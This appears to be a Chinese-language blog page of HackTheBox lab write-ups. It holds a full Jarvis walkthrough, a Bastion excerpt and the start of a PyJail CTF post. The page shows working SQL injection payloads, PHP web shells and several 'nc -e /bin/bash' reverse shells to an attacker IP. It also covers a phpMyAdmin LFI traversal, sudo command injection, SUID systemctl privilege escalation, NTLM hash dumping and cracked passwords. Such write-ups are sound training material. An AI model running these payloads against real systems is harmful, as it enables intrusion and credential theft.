<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 11:48 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> jarvis.htb (10.10.10.143)</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:<span class="built_in">cd</span>:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></tbody></table></figure>

<h1 id="二，HTTP-Enumeration"><a href="#二，HTTP-Enumeration" class="headerlink" title="二，HTTP Enumeration"></a>二，HTTP Enumeration</h1><p>第一个习惯就是先把gobuster 上起来</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w directory-list-2.3-medium.txt -u 10.10.10.143 -t 50</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122115946864.png" class="lazyload"><br>发现有 <strong>phpmyadmin</strong><br>经过一番尝试，default 账号和密码都无效。暂时先跳过。</p>
<p>继续浏览 stark hotel(钢铁侠爱好者，stark 和 jarvis)</p>
<p>在网页上发现几处可疑的域名</p>
<p><strong>supersecurehotel.htb</strong><br><strong>logger.htb</strong></p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/2020012212053773.png" class="lazyload"><br>尝试着加进去 <strong>/etc/hosts</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">10.10.10.143 jarvis.htb supersecurehotel@logger.htb supersecurehotel.htb logger.htb</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>然后分别用 jarvis.htb, supersecurehotel.htb, logger.htb 等域名进行访问。 结果还是跟之前一样的 并没有什么区别。我们接着探索。</p>
<p>一顿胡乱点击后 发现 <strong>room.php</strong> 有可疑<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122121012113.png" class="lazyload"><br>尝试加个双引号引号 <strong>“</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1<span class="string">"</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>果然报错了<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122121923813.png" class="lazyload"><br>下一步 我们可以利用 ORDER BY 或者 UNION SELECT来找出查询语句有几个字段。</p>
<p><strong>ORDER BY</strong></p>
<p>首先使用orderby子句来确定SQL语句查询的字段数量。orderby子句会根据sql查询结果的字段来排序，如果字段不存在则会报错。</p>
<p>可以先从10 开始试</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 10</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>页面显示反常，代表没有10个字段， 一个一个慢慢下试<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122122904597.png" class="lazyload"><br>试到第7的时候 页面正常返回</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>确认了 有7个字段<br>紧接着 我们能使用 UNION SELECT来确定回显位</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,3,4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>可以确定 1 应该是ID，所以没有显示。<br>2 是 评分等级<br>3 是 价钱<br>4 是 介绍<br>5 是 图片<br>6 和 7 是未知。 当然这些都不重要 重要的是 回显位我们能看到。</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122123413127.png" class="lazyload"><br>可以利用mysql的一些函数来获取更多信息。 比如database()<br>数据库的名字叫<strong>hotel</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,database(),4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122140022261.png" class="lazyload"></p>
<h1 id="三，拿shell"><a href="#三，拿shell" class="headerlink" title="三，拿shell"></a>三，拿shell</h1><h5 id="我们有两种方式来拿到-www-data。"><a href="#我们有两种方式来拿到-www-data。" class="headerlink" title="我们有两种方式来拿到 www-data。"></a>我们有两种方式来拿到 www-data。</h5><p><strong>一种为利用mysql读写的方式注入php执行nc</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE <span class="string">'file_name'</span></span><br><span class="line">1</span><br><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,<span class="string">'&lt;?php system("nc -e /bin/bash 10.10.14.10 1234");?&gt;'</span>,4,5,6,7 INTO OUTFILE <span class="string">'/var/www/html/malicious.php'</span></span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>然后我们访问 <strong>10.10.10.143/malicious.php</strong><br>成功拿到 shell<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122141038552.png" class="lazyload"></p>
<hr>
<p><strong>第二种方式是通过 mysql函数导出 数据库的用户名和密码 登陆phpmyadmin.</strong></p>
<p>使用 <strong>group_concat</strong> 可以把 同一个分组中的值连接起来,返回一个字符串结果 利用 <strong>“:”</strong> 来隔离分开</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">room</span>.php?cod=<span class="number">999</span> union select <span class="number">1</span>,<span class="number">2</span>,(select group_concat(user,<span class="string">":"</span>,password,<span class="string">":"</span>,host) from mysql.user),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们成功取得 数据库的账号和密码哈希值</p>
<p><strong>Dbadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</strong><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122141541617.png" class="lazyload"><br>利用 crackstation.net 来进行破解哈希值<br><img src="/images/placeholder.png" alt="img" data-src="/images/old-machine-images/20200122141930255.png" class="lazyload"><br>得到密码 <strong>imissyou</strong></p>
<p>找回之前的 phpmyadmin 登陆后发现<br><strong>Apache/2.4.25</strong><br><strong>phpmyadmin 4.8.0</strong><br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/2020012214211048.png" class="lazyload"><br>文章发表的时候 phpmyadmin 最新的版本为 5.0.1<br>一番searchsploit后发现 4.8.0和4.8.1 版本有远程执行文件包含漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44928">phpmyadmin 4.8 文件包含漏洞传送门</a></p>
<p>首先 运行sql命令</p>
<figure class="highlight php-template"><table><tbody><tr><td class="code"><pre><span class="line"><span class="language-xml">select '</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">"nc -e /bin/bash 10.10.14.12 1234"</span>);<span class="meta">?&gt;</span></span><span class="language-xml">'</span></span><br><span class="line"><span class="language-xml">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122142927469.png" class="lazyload"><br>拿到session的数值<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122143910250.png" class="lazyload"><br>然后进行访问</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">10.10</span>.<span class="number">10.143</span><span class="regexp">/phpmyadmin/i</span>ndex.php?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sessions/sess_b6uigkomnmk4oaa91ckc4chk4nfahaqi</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122143843553.png" class="lazyload"><br>成功！</p>
<h1 id="四，提高用户权限"><a href="#四，提高用户权限" class="headerlink" title="四，提高用户权限"></a>四，提高用户权限</h1><p>第一件事情就是试试 sudo -l 有没有任何可以利用的权限。</p>
<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">jarvis:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">jarvis:</span></span><br><span class="line">    (pepper : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /var/www/<span class="title class_">Admin</span>-<span class="title class_">Utilities</span>/simpler.py</span><br><span class="line"></span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></tbody></table></figure>

<p>这是一个小型的警报器<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122144448439.png" class="lazyload"><br>仔细看了源代码，有一个地方可以使用命令注入，虽然做了点黑名单来过滤。 但是由于 <strong>$</strong> 还能使用。 我们可以用类似 <strong>$(cmd)</strong> 的操作。</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122144636466.png" class="lazyload"></p>
<figure class="highlight nsis"><table><tbody><tr><td class="code"><pre><span class="line">sudo -u pepper /<span class="keyword">var</span>/www/<span class="literal">Admin</span>-Utilities/simpler.py -p</span><br><span class="line">Enter an IP: <span class="variable">$(bash)</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们成功拿到pepper的shell<br>这里不懂出于什么原因 我各种命令全部都没响应。于是我用nc 重新生成了一个shell<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145229923.png" class="lazyload"></p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">pepper</span>@jarvis:/$nc -e /bin/bash <span class="number">10.10.14.10</span> <span class="number">1234</span></span><br><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">10.10.14.10</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br></pre></td></tr></tbody></table></figure>

<p>于是我们成功拿到pepper 的权限<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145350946.png" class="lazyload"></p>
<h1 id="五，ROOT提权"><a href="#五，ROOT提权" class="headerlink" title="五，ROOT提权"></a>五，ROOT提权</h1><p>首先我们来查看SUID files</p>
<figure class="highlight arcade"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122145847426.png" class="lazyload">发现 <strong>systemctl</strong> 比较可疑。<br>通过 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/">gtfobins</a> 发现存在SUID 来进行提权的方法。<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122150211702.png" class="lazyload"><br>一般看到这种我都比较喜欢手动操作。<br>创建一个 pwn.service 在 pepper 的主目录里 并且把 ExecStart 指向 nc.sh</p>
<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line"><span class="attribute">Type</span>=oneshot</span><br><span class="line"><span class="attribute">ExecStart</span>=/home/pepper/nc.sh</span><br><span class="line">[Install]</span><br><span class="line"><span class="attribute">WantedBy</span>=multi-user.target</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc -e /bin/bash 10.10.14.10 1234</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></tbody></table></figure>

<p>然后我们要创建一个 symlink 起来</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">link</span> /home/pepper/pwn.service</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>打开 nc 接听<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122151106368.png" class="lazyload"></p>
<p>然后启动我们的pwn服务</p>
<figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> pwn</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们成功拿到root<br><img src="/images/placeholder.png" alt="a" data-src="/images/old-machine-images/20200122151239547.png" class="lazyload"></p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/22/HTB-jarvis/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/13/HTB-wall/">HTB Wall Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 13, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		
			<p>这台机器比较有意思，正如名字 有一道“墙”。有趣的是这台机器的CMS CVE和机器的作者是同一个人。<br>作者尽量写出自己在遇到问题的时候碰到的坑 以及做了什么尝试和思路。</p>
		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/13/HTB-wall/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/10/HTB-bastion/">HTB Bastion Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p>攻击机：官方Kali linux 2019 64位<br>作者: <strong>Ikonw</strong></p>
<p><img src="/images/placeholder.png" alt="image-20200924210807049" data-src="/images/HTB-bastion/image-20200924210807049.png" class="lazyload"></p>
<h2 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h2><p><img src="/images/placeholder.png" alt="image-20200924210826254" data-src="/images/HTB-bastion/image-20200924210826254.png" class="lazyload"></p>
<p>正常的nmap端口扫描 没有太多的资讯，只有SMB和SSH 开着。</p>
<h2 id="二，SMB-Enumeration"><a href="#二，SMB-Enumeration" class="headerlink" title="二，SMB Enumeration"></a>二，SMB Enumeration</h2><p>首先，利用smbclient 连接到靶机<br>方式有很多种， smbmap之类的 但我比较喜欢用简单的smbclient.<br>smbmap等其他工具在真实环境里 会自动进行大量操作，很容易被日志捕捉下来。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="image-20200924210848265" data-src="/images/HTB-bastion/image-20200924210848265.png" class="lazyload"></p>
<p>发现四个目标，其中三个是比较正常。<br>有意思的是 <strong>Backups</strong></p>
<p>我们利用smbclient 看看是否允许我们连接到 <strong>Backups</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.134\\Backups</span><br></pre></td></tr></tbody></table></figure>

<p>这里利用””来 逃脱 “” 所以需要4个，而backup 两个。</p>
<p><img src="/images/placeholder.png" alt="image-20200924210918572" data-src="/images/HTB-bastion/image-20200924210918572.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="asd" data-src="/images/HTB-bastion/2020011001300488.png" class="lazyload"></p>
<p>成功进入，发现三个文件。利用 <strong>get</strong> 把 <strong>note.txt</strong> 下载到本地。<br>大概的意思就是 系统管理员建议不要把整个backup 文件夹下载到本地。<br>按照文件夹的名字来看，应该是windows镜像的备份。</p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110013425912.png" class="lazyload"></p>
<p>于是我尝试将整个backup都挂载到本地。<br>在本地创建文件夹 <strong>/mnt/backup</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw</span><br></pre></td></tr></tbody></table></figure>

<p>挂载到本地并且允许读写操作</p>
<p><img src="/images/placeholder.png" alt="在这asd述" data-src="/images/HTB-bastion/20200110013652862.png" class="lazyload"></p>
<p>7z 有一个功能是可以让你直接读取 vhd文件的格式。我们直接来读取5gb的文件<br>(文件较大 大概2分钟左右， 文件较多就只展示一部分）</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在fdsaf" data-src="/images/HTB-bastion/20200110014239133.png" class="lazyload"></p>
<p>可以看到这是几乎整个windows的备份。<br>既然是windows备份 我们是不是可以从SAM File里面直接提取用户的帐号密码呢</p>
<h2 id="三，用户帐号密码"><a href="#三，用户帐号密码" class="headerlink" title="三，用户帐号密码"></a>三，用户帐号密码</h2><p>7z 只是让我们看到了文件，而不能看到内容。<br>我稍微google 了一下，发现一个兄弟在medium上面有篇文章利用ghost-mount挂载虚拟硬盘。<br>linux的 ghostmount 能让我们进入虚拟硬盘的文件</p>
<p>链接: <a target="_blank" rel="noopener" href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">文章地址</a></p>
<p>跟着大哥走<br>首先我们需要<strong>安装 libguestfs-tools</strong>这个库</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></tbody></table></figure>

<p>简单的安装后，我们创建一个新的文件夹 <strong>/mnt/vhd</strong></p>
<p>把vhd挂载在 这个文件夹</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在asdasd" data-src="/images/HTB-bastion/20200110015004404.png" class="lazyload"></p>
<p>可以看到已经可以进入到 vhd文件里进行操作。<br>我首先要做的就是能不能直接到user desktop里拿到 user.txt</p>
<p>samdump2可以完成这个任务</p>
<p><img src="/images/placeholder.png" alt="在这asdasd" data-src="/images/HTB-bastion/20200110015521278.png" class="lazyload"></p>
<p>关于哈希值的利用方法很多，既然SMB是开着的 完全可以用哈希值传递攻击 登录系统。<br>个人原因 我比较喜欢尝试破解密码</p>
<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line">*disabled* Administrator:<span class="number">500</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">*disabled* Guest:<span class="number">501</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">L<span class="number">4</span>mpje:<span class="number">1000</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">26112010952</span>d<span class="number">963</span><span class="keyword">c</span><span class="number">8</span>dc<span class="number">4217</span>daec<span class="number">986</span>d<span class="number">9</span>:::</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></tbody></table></figure>

<p>注意这边 administrator和 Guest显得的是 <strong>disable</strong><br>正常来说格式是<br>&lt;用户名&gt;:&lt;用户ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;留言&gt;:&lt;主目录&gt;<br>Administrator和guest的 LM HASH和NT hash都是一模一样。<br>这边要注意 aad3 和 31d6 都是代表为空说明这里没有数值<br>题外话。</p>
<p>我们把L4mpje 的哈希值丢到crackstation.net 进行破解<br>得到帐号密码<br>L4mpje：bureaulampje</p>
<p><img src="/images/placeholder.png" alt="在这sadad" data-src="/images/HTB-bastion/20200110020035505.png" class="lazyload"></p>
<p>很可惜 我们没有 RDP， 但我们有SSH（狗头）</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">password: bureaulampje</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>

<p>成功拿到 cmd shell<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020241609.png" class="lazyload"><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020309865.png" class="lazyload"><br>现在开始准备提权。<br>碰到windows 我个人习惯是上JAWL 的脚本来看系统的信息来帮助我提权。</p>
<p>链接: <a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">Jawl github地址</a></p>
<p>因为这是我的第一个文章 我就简单的说下 如何在windows里传输文件<br>其实方式有很多种，<br>有的情况这个可以 有的情况那个可以<br>我就简单说一下 我个人喜爱的一个方法。<br><strong>powershell</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -c <span class="string">"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.12/jaw</span></span><br><span class="line"><span class="string">s-enum.ps1','C:\Users\L4mpje\Desktop\jaws-enum.ps1')</span></span><br><span class="line"><span class="string">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>题外话结束</p>
<p>执行jaws-enum.ps1</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>大概的看了下 并没有什么有趣的信息，但有一个地方引起了关注<br><strong>mRemoteNG</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020826900.png" class="lazyload"></p>
<h2 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h2><p>碰到陌生的软件就要上Google询问，果然我们发现了这软件存在比较弱的密码保护管理。<br><img src="/images/placeholder.png" alt="在这里插sad" data-src="/images/HTB-bastion/20200110021000221.png" class="lazyload"><br>在另外一篇文章里 我们发现了储存密码的目录 是位于Appdata里。</p>
<p>链接:<a target="_blank" rel="noopener" href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">文章传送门</a></p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021043792.png" class="lazyload"><br>这里再说点题外话。<br>Appdata属于隐藏的文件夹类型 正常的dir 是无法看见文件夹</p>
<p><img src="/images/placeholder.png" alt="sadfasdfaf" data-src="/images/HTB-bastion/20200110021237568.png" class="lazyload"></p>
<p>利用 <strong>dir/a</strong> 来显示全部的文件</p>
<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021316395.png" class="lazyload"></p>
<p>成功找到管理员的密码</p>
<p><img src="/images/placeholder.png" alt="a" data-src="/images/HTB-bastion/20200110021405254.png" class="lazyload"></p>
<p>利用github上面的一个python 脚本 来算出密码</p>
<p>链接:github传送门</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 mremote_decrypt.py -s <span class="string">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span></span><br><span class="line"></span><br><span class="line">成功取得密码</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110021514274.png" class="lazyload"></p>
<p>紧接着 SSH登陆管理员 并拿到root.txt</p>
<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110021619237.png" class="lazyload"></p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/01/10/HTB-bastion/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2007/12/31/CTF%20-%20uoftctf/">CTF - uoftctf</a>  
	       
		 

		<div class="meta">
			<time>Dec 31, 2007</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<h1 id="Jail-Baby’s-First-PyJail"><a href="#Jail-Baby’s-First-PyJail" class="headerlink" title="Jail - Baby’s First PyJail"></a>Jail - Baby’s First PyJail</h1><blockquote>
<p>@windex told me that jails should be sourceless. So no source for you.</p>
</blockquote>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115164611584.png" class="lazyload"></p>
<p>Certain words are filtered <code>'import', 'exec', 'eval', 'os', 'open', 'read', 'system', 'module', 'write', '.'</code></p>
<p>By printing the <code>__builtins__</code></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">dir</span>(__builtins__))</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BlockingIOError'</span>, <span class="string">'BrokenPipeError'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'ChildProcessError'</span>, <span class="string">'ConnectionAbortedError'</span>, <span class="string">'ConnectionError'</span>, <span class="string">'ConnectionRefusedError'</span>, <span class="string">'ConnectionResetError'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EncodingWarning'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FileExistsError'</span>, <span class="string">'FileNotFoundError'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'InterruptedError'</span>, <span class="string">'IsADirectoryError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'ModuleNotFoundError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotADirectoryError'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span 